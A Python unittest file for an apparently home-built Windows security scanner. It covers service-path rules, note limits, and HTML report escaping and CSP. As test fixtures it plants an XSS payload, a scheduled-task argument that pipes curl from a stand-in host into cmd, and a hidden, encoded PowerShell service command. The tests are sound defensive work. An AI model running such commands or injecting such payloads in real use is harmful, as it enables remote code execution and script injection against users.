"""Slice 6 tests: the SYSTEM-service rule, the longer severity-note limit, and
the HTML report's escaping, Content-Security-Policy and content.

    python -m unittest test_slice6 -v
"""

import contextlib
import io
import json
import re
import tempfile
import unittest
from datetime import datetime, timezone
from html.parser import HTMLParser
from pathlib import Path

import baseline
import checks
import redact
import report_html
import runner
import scan
import snapshot
import validate
from test_slice1 import fake_run
from test_slice4 import good_answer

NOW = datetime(2026, 11, 23, 12, 0, 0, tzinfo=timezone.utc)
EVIL = '"><script>alert(1)</script><img src=x onerror=alert(2)>'


def ok(name, data):
    return runner.RunResult(name, True, json.dumps(data))


def planted(overrides=None, now=NOW):
    snap = snapshot.build_snapshot(fake_run(overrides), now=now)
    return snap, checks.run_checks(snap)


def service(name, path, run_as="LocalSystem"):
    return {"Name": name, "DisplayName": name, "PathName": path, "State": "Running", "StartName": run_as}


class Tags(HTMLParser):
    """Every real tag the browser would build, with its attributes."""

    def __init__(self):
        super().__init__()
        self.tags = []

    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, dict(attrs)))


def parse(text):
    p = Tags()
    p.feed(text)
    return p.tags


class SystemServiceRuleTests(unittest.TestCase):
    def services(self, *rows):
        snap, findings = planted({"win_auto_services": ok("win_auto_services", list(rows))})
        return findings

    def test_system_service_from_appdata_is_medium(self):
        f = self.services(service("Upd", "C:\\Users\\a\\AppData\\Local\\u\\u.exe"))
        hits = [x for x in f if x["check"] == "SVC-SYSTEM-USER-PATH"]
        self.assertEqual([(x["subject"], x["severity"]) for x in hits], [("Upd", "medium")])
        self.assertEqual([x for x in f if x["check"] == "PERSIST-REVIEW" and x["subject"] == "Upd"], [])

    def test_nt_authority_system_counts(self):
        f = self.services(service("Upd", "C:\\Users\\Public\\u.exe", run_as="NT AUTHORITY\\SYSTEM"))
        self.assertTrue(any(x["check"] == "SVC-SYSTEM-USER-PATH" for x in f))

    def test_non_system_service_stays_a_low_review(self):
        f = self.services(service("Upd", "C:\\Users\\a\\AppData\\Local\\u\\u.exe", run_as="NT AUTHORITY\\LocalService"))
        self.assertFalse(any(x["check"] == "SVC-SYSTEM-USER-PATH" for x in f))
        self.assertTrue(any(x["check"] == "PERSIST-REVIEW" and x["subject"] == "Upd" for x in f))

    def test_programdata_and_program_files_are_not_flagged(self):
        f = self.services(service("A", "C:\\ProgramData\\vendor\\a.exe"),
                          service("B", "\"C:\\Program Files\\Vendor\\b.exe\""))
        self.assertFalse(any(x["check"] == "SVC-SYSTEM-USER-PATH" for x in f))

    def test_suspicious_system_service_keeps_its_suspicious_finding(self):
        f = self.services(service("Bad", "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4A"))
        self.assertTrue(any(x["check"] == "PERSIST-SUSPICIOUS" and x["subject"] == "Bad" for x in f))


class NoteLimitTests(unittest.TestCase):
    def test_note_reason_up_to_800_chars_is_kept(self):
        snap, findings = planted()
        low = next(f for f in findings if f["check"] == "ACCT-DAILY-ADMIN")
        for length, kept in ((470, True), (790, True), (900, False)):
            a = good_answer(findings)
            a["severity_notes"] = [{"finding_id": low["id"], "suggested_severity": "medium", "reason": "x" * length}]
            v = validate.validate(a, findings, redact.Redactor(snap))
            self.assertEqual(bool(v["notes"]), kept, length)


class HtmlSafetyTests(unittest.TestCase):
    def setUp(self):
        tasks = json.loads((Path(__file__).parent / "fixtures/recorded/win_scheduled_tasks.json").read_text())
        tasks.append({"TaskPath": "\\", "TaskName": EVIL, "State": "Ready", "Author": EVIL, "UserId": "x",
                      "RunLevel": "Limited", "Execute": "cmd.exe", "Arguments": "/c curl http://x.invalid | cmd",
                      "ClassId": None})
        self.snap, self.findings = planted({"win_scheduled_tasks": ok("win_scheduled_tasks", tasks)})
        a = good_answer(self.findings)
        a["summary"] = "Summary " + EVIL
        a["groups"][1]["explanation"] = "# heading\n\n" + EVIL
        v = validate.validate(a, self.findings, redact.Redactor(self.snap))
        self.ai = {"validated": v, "info": {"model": "m", "input_tokens": 1, "output_tokens": 2}}
        self.text = report_html.render(self.snap, self.findings, {"diff": None}, self.ai)
        self.tags = parse(self.text)

    def test_hostile_text_never_becomes_a_tag(self):
        self.assertTrue(any(EVIL[:20] in f["subject"] for f in self.findings), "fixture didn't plant the text")
        self.assertNotIn("<script>alert", self.text)
        self.assertNotIn("<img", self.text)
        self.assertIn("&lt;script&gt;alert(1)&lt;/script&gt;", self.text)
        self.assertEqual([t for t, a in self.tags if t == "img"], [])
        self.assertFalse(any(k.startswith("on") for _, a in self.tags for k in a), "an event-handler attribute leaked")

    def test_csp_allows_only_this_reports_nonce(self):
        meta = [a for t, a in self.tags if t == "meta" and a.get("http-equiv") == "Content-Security-Policy"]
        self.assertEqual(len(meta), 1)
        csp = meta[0]["content"]
        nonce = re.search(r"script-src 'nonce-([^']+)'", csp).group(1)
        self.assertIn("default-src 'none'", csp)
        self.assertNotIn("unsafe-inline", csp)
        scripts = [a for t, a in self.tags if t == "script"]
        styles = [a for t, a in self.tags if t == "style"]
        self.assertEqual(len(scripts), 1)
        self.assertEqual(len(styles), 1)
        self.assertEqual({scripts[0].get("nonce"), styles[0].get("nonce")}, {nonce})

    def test_nonce_differs_every_render(self):
        again = report_html.render(self.snap, self.findings, None, None)
        n1 = re.search(r"nonce-([^']+)'", self.text).group(1)
        n2 = re.search(r"nonce-([^']+)'", again).group(1)
        self.assertNotEqual(n1, n2)

    def test_nothing_loads_from_outside(self):
        for tag, attrs in self.tags:
            self.assertNotIn("src", attrs, tag)
            href = attrs.get("href")
            self.assertTrue(href is None or href.startswith("#"), f"{tag} href={href}")

    def test_claude_text_is_plain_text(self):
        self.assertNotIn("<h1>heading", self.text)
        self.assertIn("# heading", self.text)


class HtmlContentTests(unittest.TestCase):
    def test_counts_cards_and_filters(self):
        snap, findings = planted()
        text = report_html.render(snap, findings, None, None)
        tags = parse(text)
        cards = [a for t, a in tags if t == "details"]
        self.assertEqual(len(cards), len(findings))
        self.assertEqual({a["data-sev"] for a in cards}, {f["severity"] for f in findings})
        high = sum(1 for f in findings if f["severity"] == "high")
        self.assertIn(f'data-filter="high" aria-pressed="false">high <b>{high}</b>', text)
        self.assertEqual(sum(1 for a in cards if "open" in a), sum(1 for f in findings if f["severity"] in ("high", "medium")))

    def test_ai_groups_link_to_findings(self):
        snap, findings = planted()
        v = validate.validate(good_answer(findings), findings, redact.Redactor(snap))
        text = report_html.render(snap, findings, None, {"validated": v, "info": {}})
        links = {a["href"] for t, a in parse(text) if t == "a"}
        ids = {f"#{a['id']}" for t, a in parse(text) if t == "details"}
        self.assertTrue(links)
        self.assertLessEqual(links, ids)

    def test_ai_error_and_no_findings(self):
        snap, _ = planted()
        text = report_html.render(snap, [], None, {"error": "Claude declined"})
        self.assertIn("Not available: Claude declined", text)
        self.assertIn("No findings.", text)

    def test_changes_section(self):
        old, _ = planted(now=datetime(2026, 11, 16, tzinfo=timezone.utc))
        new, findings = planted({"win_run_keys": ok("win_run_keys", [])})
        d = baseline.diff(old, new)
        text = report_html.render(new, findings, {"diff": d, "label": "base"}, None)
        self.assertIn("Removed since last scan", text)
        self.assertIn("WinUpdateHelper", text)

    def test_scan_writes_html(self):
        with tempfile.TemporaryDirectory() as d:
            p = snapshot.save_snapshot(planted()[0], Path(d) / "snapshots")
            with contextlib.redirect_stdout(io.StringIO()):
                scan.main(["--from-snapshot", str(p), "--out", d])
            pages = list((Path(d) / "reports").glob("*.html"))
            self.assertEqual(len(pages), 1)
            self.assertIn("Security posture report", pages[0].read_text())


def as_admin(admin=True):
    host = json.loads((Path(__file__).parent / "fixtures/recorded/win_host_info.json").read_text())
    host[0]["IsAdmin"] = admin
    return {"win_host_info": ok("win_host_info", host)}


class AdminModeTests(unittest.TestCase):
    def bitlocker(self, rows=None, error=None):
        r = runner.RunResult("win_bitlocker", False, error=error) if error else ok("win_bitlocker", rows)
        return planted({"win_bitlocker": r})

    def test_system_drive_off_is_medium_data_drive_ignored(self):
        _, f = self.bitlocker([{"MountPoint": "C:", "VolumeType": "OperatingSystem", "ProtectionStatus": "Off"},
                               {"MountPoint": "E:", "VolumeType": "Data", "ProtectionStatus": "Off"}])
        self.assertEqual([(x["subject"], x["severity"]) for x in f if x["check"] == "BITLOCKER-OFF"],
                         [("C:", "medium")])

    def test_system_drive_on_is_fine(self):
        _, f = self.bitlocker([{"MountPoint": "C:", "VolumeType": "OperatingSystem", "ProtectionStatus": "On"}])
        self.assertFalse(any(x["check"] == "BITLOCKER-OFF" for x in f))

    def test_access_denied_becomes_needs_admin(self):
        snap, f = self.bitlocker(error="Get-CimInstance : Access denied")
        self.assertEqual(snap["sections"]["bitlocker"]["error"], collectors_needs_admin())
        self.assertFalse(any(x["check"] == "BITLOCKER-OFF" for x in f))

    def test_missing_cmdlet_is_not_available(self):
        snap, _ = self.bitlocker(error="The term 'Get-BitLockerVolume' is not recognized as the name of a cmdlet")
        self.assertEqual(snap["sections"]["bitlocker"]["error"], "not available on this Windows edition")

    def test_baseline_picks_a_scan_at_the_same_admin_level(self):
        with tempfile.TemporaryDirectory() as d:
            older_admin = snapshot.save_snapshot(planted(as_admin(True), datetime(2026, 11, 1, tzinfo=timezone.utc))[0], d)
            snapshot.save_snapshot(planted(as_admin(False), datetime(2026, 11, 8, tzinfo=timezone.utc))[0], d)
            current = snapshot.save_snapshot(planted(as_admin(True), datetime(2026, 11, 15, tzinfo=timezone.utc))[0], d)
            self.assertEqual(baseline.previous_snapshot_path(d, current, admin=True), str(older_admin))
            self.assertTrue(baseline.previous_snapshot_path(d, current, admin=False).endswith("20261108T000000Z.json"))
            self.assertTrue(baseline.previous_snapshot_path(d, current).endswith("20261108T000000Z.json"))

    def test_mixed_admin_levels_skip_visibility_sections(self):
        old, _ = planted(as_admin(False), datetime(2026, 11, 16, tzinfo=timezone.utc))
        new, findings = planted(as_admin(True))
        d = baseline.diff(old, new)
        self.assertTrue(d["admin_mismatch"])
        for name in ("scheduled_tasks", "listening_ports", "run_keys", "defender"):
            self.assertIn(name, d["skipped"])
        self.assertIn("local_admins", d["sections"])  # accounts look the same either way
        text = report_html.render(new, findings, {"diff": d, "label": "base"}, None)
        self.assertIn("one scan ran as admin and the other didn", text)

    def test_partial_scan_banner_only_without_admin(self):
        import report
        partial, f1 = planted(as_admin(False))
        full, f2 = planted(as_admin(True))
        self.assertIn("Partial scan", report.render(partial, f1))
        self.assertIn("Partial scan", report_html.render(partial, f1))
        self.assertNotIn("Partial scan: this ran", report.render(full, f2))
        self.assertNotIn("note partial", report_html.render(full, f2))

    def test_require_admin_stops_before_scanning(self):
        orig = scan.windows_admin
        scan.windows_admin = lambda: False
        try:
            with tempfile.TemporaryDirectory() as d, contextlib.redirect_stderr(io.StringIO()) as err:
                code = scan.main(["--require-admin", "--out", d])
                self.assertEqual(code, 2)
                self.assertFalse((Path(d) / "snapshots").exists())
            self.assertIn("wsl -e bash -lc", err.getvalue())
            self.assertIn("scan.py --require-admin", err.getvalue())
        finally:
            scan.windows_admin = orig

    def test_admin_command_drops_the_saved_snapshot_option(self):
        cmd = scan.admin_command(["--from-snapshot", "data/snapshots/x.json", "--explain"])
        self.assertTrue(cmd.startswith('wsl -e bash -lc "cd '))
        self.assertIn("scan.py --explain", cmd)
        self.assertNotIn("x.json", cmd)

    def test_ports_warn_when_most_program_paths_are_hidden(self):
        snap, _ = planted()  # fixture: 3 of 5 listeners have no path, as in a non-admin scan
        self.assertIn("program path hidden for 3 of 5", snap["sections"]["listening_ports"]["warning"])


def collectors_needs_admin():
    import collectors
    return collectors.NEEDS_ADMIN


if __name__ == "__main__":
    unittest.main()
